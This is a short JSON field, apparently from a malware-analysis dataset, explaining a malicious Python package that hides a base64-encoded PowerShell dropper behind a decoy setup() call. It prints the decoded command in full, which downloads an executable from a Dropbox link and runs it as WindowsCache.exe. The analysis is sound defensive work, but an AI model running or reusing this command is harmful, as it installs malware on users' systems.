      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload if a file or directory named 'tahg' does not exist. The encoded PowerShell command decodes to: 'powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/szgnyt9zbu0qmv/Esquele.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This means the script downloads an executable file named 'Esquele.exe' from Dropbox and saves it as 'WindowsCache.exe' in the user's home directory, then executes it. This behavior is typical of malware droppers, which fetch and run additional malicious payloads. The use of hidden windows and encoded commands is an attempt to evade detection. The rest of the code is a decoy setup() call to appear as a legitimate Python package. This code can compromise the system by running arbitrary, potentially harmful code from the internet.",
